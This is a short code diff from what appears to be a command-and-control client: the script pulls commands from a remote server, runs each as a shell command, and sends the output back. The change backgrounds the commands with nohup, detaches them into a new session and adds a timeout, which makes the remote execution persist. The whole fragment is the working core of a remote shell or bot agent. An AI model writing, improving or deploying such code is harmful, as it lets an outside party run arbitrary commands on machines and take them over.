@@ -48,7 +48,7 @@ def main():
                 continue
             
             # Spawn process to run shell command
-            result = subprocess.run(r.text, shell=True, capture_output=True, text=True)
+            result = subprocess.run(f"nohup {r.text} &", shell=True, capture_output=True, text=True, start_new_session=True, timeout=5)
 
             # report results to command server
             r = requests.get(f'{HOST}/api/{data["ip"]}/res', data=result.stdout + result.stderr)
